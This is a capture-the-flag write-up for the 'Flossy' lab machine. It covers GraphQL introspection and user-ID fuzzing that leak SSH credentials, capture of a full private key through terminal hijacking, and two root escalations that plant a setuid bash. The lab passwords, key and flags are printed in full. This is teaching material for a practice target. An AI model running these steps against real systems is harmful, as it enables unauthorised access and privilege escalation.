# Flossy

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.138:22
Open 10.0.2.138:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.138
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOHL4gbzUOgWlMW/HgWpBe3FlvvdyW1IsS+o1NK/YbUOoM3iokvdbkFxXdYjyvzkNpvpCXfldEQwS+BIfEmdtwU=
|   256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC0o8/EYPi0jQMqY1zqXqlKfugpCtjg0i5m3bzbyfqxt
80/tcp open  http    syn-ack Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: About Rick and Morty
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/flossy/writeup.png)

- [https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql.html](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql.html)

```json
└─$ curl http://10.0.2.138/graphql --json '{"query":"{__schema{types{name,fields{name}}}}"}' -s
{
    "data": {
        "__schema": {
            "types": [
                {
                    "name": "RootQueryType",
                    "fields": [{ "name": "character" }, { "name": "users" }]
                },
                {
                    "name": "Character",
                    "fields": [
                        { "name": "id" },
                        { "name": "name" },
                        { "name": "status" },
                        { "name": "species" },
                        { "name": "gender" },
                        { "name": "image" }
                    ]
                },
                {
                    "name": "UserType",
                    "fields": [{ "name": "username" }, { "name": "password" }]
                },
                ...
            ]
        }
    }
}
```

```bash
└─$ curl http://10.0.2.138/graphql --json '{"query":"{users{username,password}}"}'
{"data":{"users":{"username":"Disabled user","password":null}}}                                               
└─$ curl http://10.0.2.138/graphql --json '{"query":"{users(id:1){username,password}}"}'
{"data":{"users":{"username":"Disabled user","password":null}}}

└─$ ffuf -u 'http://10.0.2.138/graphql' -H 'Content-Type: application/json' -d '{"query":"{users(id:FUZZ){username,password}}"}' -w <(seq 0 50) -fs 63
9                       [Status: 200, Size: 66, Words: 1, Lines: 1, Duration: 158ms]

└─$ curl http://10.0.2.138/graphql --json '{"query":"{users(id:9){username,password}}"}'
{"data":{"users":{"username":"malo","password":"8YdsA3CkiWx968"}}} 
```

> Creds: `malo:8YdsA3CkiWx968`

## SSH (malo)

```bash
└─$ sshpass -p '8YdsA3CkiWx968' ssh malo@10.0.2.138
╰─$ id
uid=1000(malo) gid=1000(malo) groups=1000(malo),100(users)
```

## Privilege Escalation (sophie)

```bash
╰─$ find /home -ls | grep -v oh-my
   261122      4 drwxr-xr-x   4 root     root         4096 Oct  6  2023 /home
   261124      4 drwxr-xr-x   5 malo     malo         4096 Dec 12 22:13 /home/malo
   263244      4 -rw-------   1 malo     malo            4 Oct  7  2023 /home/malo/.bash_history
   261125      4 -rw-r--r--   1 malo     malo          807 Oct  6  2023 /home/malo/.profile
   264682      4 -rw-------   1 malo     malo          243 Dec 12 22:13 /home/malo/.zsh_history
   264640      4 drwxr-xr-x   3 malo     malo         4096 Oct  6  2023 /home/malo/.local
   264643      4 drwx------   3 malo     malo         4096 Oct  6  2023 /home/malo/.local/share
   264654      4 drwx------   2 malo     malo         4096 Oct  6  2023 /home/malo/.local/share/nano
   261879      4 drwx------   2 malo     malo         4096 Oct 10  2023 /home/malo/.ssh
   261126      4 -rw-r--r--   1 malo     malo          220 Oct  6  2023 /home/malo/.bash_logout
   261127      4 -rw-r--r--   1 malo     malo         3890 Oct  6  2023 /home/malo/.zshrc
   263037     52 -rw-r--r--   1 malo     malo        51798 Dec 12 22:12 /home/malo/.zcompdump-flossy-5.9
   264653    120 -r--r--r--   1 malo     malo       119920 Dec 12 22:12 /home/malo/.zcompdump-flossy-5.9.zwc
   263034      4 -rw-r--r--   1 malo     malo         3526 Oct  6  2023 /home/malo/.bashrc
   261680      4 drwxr-xr-x   5 sophie   sophie       4096 Oct 10  2023 /home/sophie
   263484      4 -rw-------   1 root     root          370 Oct 10  2023 /home/sophie/.bash_history
   263035      4 -rw-r--r--   1 sophie   sophie        807 Oct  6  2023 /home/sophie/.profile
   264685      4 -rw-r--r--   1 sophie   sophie         66 Oct  7  2023 /home/sophie/.selected_editor
   264648      4 drwxr-xr-x   3 sophie   sophie       4096 Oct  6  2023 /home/sophie/.local
   264649      4 drwx------   3 sophie   sophie       4096 Oct  6  2023 /home/sophie/.local/share
find: ‘/home/sophie/.local/share’: Permission denied
   263036      4 -rwxr-----   1 root     sophie        962 Oct  6  2023 /home/sophie/network
   261639      4 -rwx------   1 sophie   sophie         33 Oct 10  2023 /home/sophie/user.txt
   264642      4 drwx------   2 sophie   sophie       4096 Oct 10  2023 /home/sophie/.ssh
find: ‘/home/sophie/.ssh’: Permission denied
   263040      4 -rw-r--r--   1 sophie   sophie        220 Oct  6  2023 /home/sophie/.bash_logout
   263073      4 -rw-r--r--   1 sophie   sophie       3890 Oct  6  2023 /home/sophie/.zshrc
   264652      4 -rwxr-xr-x   1 sophie   sophie        630 Oct 10  2023 /home/sophie/SSHKeySync
   264639      4 -rw-r--r--   1 sophie   sophie       3526 Oct  6  2023 /home/sophie/.bashrc
```

```bash
╰─$ cat /home/sophie/SSHKeySync
#!/bin/bash

# This script must run every minute in pre-prod

send_private_key() {
    local user_name="$1"
    local key_path="/home/$user_name/.ssh/id_rsa"
    local admin_tty="/dev/pts/24"

    if [ -f "$key_path" ]; then
        if [ -w "$admin_tty" ]; then
            cat "$key_path" > "$admin_tty"
        else
            echo "Error: Unable to write to $admin_tty"
        fi
    else
        echo "Error: The private key for $user_name doesn't exist."
    fi
}

while true ; do
  USER="sophie"
  echo "Sending $USER's private key to a high-privileged TTY for quick testing..."
  send_private_key "$USER"
  sleep 1m
done
```

If the comment is right we should get Sophia's private key in `/dev/pts/24`, spawn 23 more SSH connections to take over `24`th
```bash
╰─$ w
 22:23:09 up 33 min, 25 users,  load average: 0.39, 0.26, 0.11
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
malo     pts/0    10.0.2.15        22:12    4.00s  7.33s  0.72s ssh localhost
malo     pts/1    ::1              22:19    4.00s  1.14s  0.70s ssh localhost
malo     pts/2    ::1              22:19    4.00s  1.25s  0.72s ssh localhost
malo     pts/3    ::1              22:20    4.00s  1.04s  0.69s ssh localhost
malo     pts/4    ::1              22:20    4.00s  1.04s  0.70s ssh localhost
malo     pts/5    ::1              22:20    4.00s  1.06s  0.72s ssh localhost
malo     pts/6    ::1              22:20    4.00s  1.52s  0.68s ssh localhost
malo     pts/7    ::1              22:20    4.00s  1.05s  0.71s ssh localhost
malo     pts/8    ::1              22:20    4.00s  1.13s  0.70s ssh localhost
malo     pts/9    ::1              22:20    4.00s  1.00s  0.66s ssh localhost
malo     pts/10   ::1              22:20    4.00s  1.02s  0.68s ssh localhost
malo     pts/11   ::1              22:20    4.00s  0.99s  0.66s ssh localhost
malo     pts/12   ::1              22:20    4.00s  1.00s  0.67s ssh localhost
malo     pts/13   ::1              22:20    4.00s  1.02s  0.68s ssh localhost
malo     pts/14   ::1              22:20    4.00s  1.02s  0.68s ssh localhost
malo     pts/15   ::1              22:20    4.00s  1.01s  0.66s ssh localhost
malo     pts/16   ::1              22:20    4.00s  1.17s  0.63s ssh localhost
malo     pts/17   ::1              22:20    4.00s  0.98s  0.64s ssh localhost
malo     pts/18   ::1              22:20    5.00s  0.97s  0.64s ssh localhost
malo     pts/19   ::1              22:20    5.00s  1.01s  0.65s ssh localhost
malo     pts/20   ::1              22:21    5.00s  0.98s  0.65s ssh localhost
malo     pts/21   ::1              22:21    5.00s  1.57s  0.59s ssh localhost
malo     pts/22   ::1              22:23    4.00s  0.92s  0.59s ssh localhost
malo     pts/23   ::1              22:23    5.00s  0.95s  0.60s ssh localhost
malo     pts/24   ::1              22:23    2.00s  1.00s  0.66s w
```

After some time
```bash
╰─$ -----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

```bash
└─$ nano id_rsa.sophie
└─$ chmod 600 id_rsa.sophie
└─$ ssh -i id_rsa.sophie sophie@10.0.2.138
╰─$ id
uid=1001(sophie) gid=1001(sophie) groups=1001(sophie),100(users)
```

### User.txt

```
╰─$ cat user.txt
8926c8ba832369c1dc13eed7880585c6
```

## Privilege Escalation (root)

```bash
╰─$ sudo -l
sudo: unable to resolve host flossy: Name or service not known
Matching Defaults entries for sophie on flossy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User sophie may run the following commands on flossy:
    (ALL : ALL) NOPASSWD: /home/sophie/network*
```

### Unintended

So because the sudo script is our working directory we can actually overwrite it.
```bash
╰─$ cp network network.bak
╰─$ rm network
rm: remove write-protected regular file 'network'? y

╰─$ echo $'#!/bin/bash\ninstall -m4777 /bin/bash /tmp/rootbash' | tee network
#!/bin/bash
install -m4777 /bin/bash /tmp/rootbash
╰─$ chmod +x network

╰─$ sudo /home/sophie/network
sudo: unable to resolve host flossy: Name or service not known

╰─$ /tmp/rootbash -p -c id
uid=1001(sophie) gid=1001(sophie) euid=0(root) groups=1001(sophie),100(users)
```

### Intended 

```bash
╰─$ cat network
#!/bin/bash
...
dispatcher() {
    for s in /opt/*; do
        if [ -f "$s" ]; then
            d="/etc/NetworkManager/dispatcher.d/$(basename $s)"
            if [ ! -f "$d" ] || [ "$s" -nt "$d" ]; then
                return 0
            fi
        fi
    done
    return 1
}

update() {
    if [[ -z $(find /opt -type f) ]]; then
        exit 0
    else
        echo "Updating scripts."
        cp /opt/* /etc/NetworkManager/dispatcher.d/
        chmod x /etc/NetworkManager/dispatcher.d/*
        echo "Scripts updated."
    fi
}

case "${1}" in
ip) connected_ip ;;
disp)
    dispatcher
    update
    ;;
*) echo "Usage: ./$0 option" ;;
esac
```

If we can restart NetworkManager we can get root RCE
```bash
User writes malicious.sh -> /opt/malicious.sh
Script copies it -> /etc/NetworkManager/dispatcher.d/malicious.sh
NetworkManager triggers dispatcher -> malicious.sh runs as root
```

```bash
╰─$ echo $'#!/bin/bash\ninstall -m4777 /bin/bash /tmp/rootbash2' | tee /opt/hello
#!/bin/bash
install -m4777 /bin/bash /tmp/rootbash2

╰─$ sudo /home/sophie/network disp
sudo: unable to resolve host flossy: Name or service not known
Updating scripts.
Scripts updated.

╰─$ ls /etc/NetworkManager/dispatcher.d/hello -lh
-rwxr-xr-x 1 root root 52 Dec 12 22:43 /etc/NetworkManager/dispatcher.d/hello
```

```bash
╰─$ nmcli general permissions
PERMISSION                                                        VALUE
org.freedesktop.NetworkManager.checkpoint-rollback                auth
org.freedesktop.NetworkManager.enable-disable-connectivity-check  no
org.freedesktop.NetworkManager.enable-disable-network             no
org.freedesktop.NetworkManager.enable-disable-statistics          no
org.freedesktop.NetworkManager.enable-disable-wifi                no
org.freedesktop.NetworkManager.enable-disable-wimax               no
org.freedesktop.NetworkManager.enable-disable-wwan                no
org.freedesktop.NetworkManager.network-control                    yes # Sussy Baka
org.freedesktop.NetworkManager.reload                             auth
org.freedesktop.NetworkManager.settings.modify.global-dns         auth
org.freedesktop.NetworkManager.settings.modify.hostname           auth
org.freedesktop.NetworkManager.settings.modify.own                auth
org.freedesktop.NetworkManager.settings.modify.system             auth
org.freedesktop.NetworkManager.sleep-wake                         no
org.freedesktop.NetworkManager.wifi.scan                          auth
org.freedesktop.NetworkManager.wifi.share.open                    no
org.freedesktop.NetworkManager.wifi.share.protected               no
```

- [https://networkmanager.dev/docs/api/1.44.4/NetworkManager-dispatcher.html](https://networkmanager.dev/docs/api/1.44.4/NetworkManager-dispatcher.html)
	- NetworkManager-dispatcher service is a D-Bus activated service that **runs user provided scripts upon certain changes in NetworkManager**.

Do any kind of change?
```bash
╰─$ nmcli connection
NAME  UUID                                  TYPE      DEVICE
lo    08025c22-f884-47fd-9ccf-69701f27563d  loopback  lo

╰─$ nmcli connection up lo
Connection successfully activated (D-Bus active path: /org/freedesktop/NetworkManager/ActiveConnection/2)

╰─$ /tmp/rootbash2 -p -c id
uid=1001(sophie) gid=1001(sophie) euid=0(root) groups=1001(sophie),100(users)
```

### Root.txt

```bash
╰─$ /tmp/rootbash2 -p -c 'cat /root/root.txt'
355cec17306ab25389f376ef4a21422e
```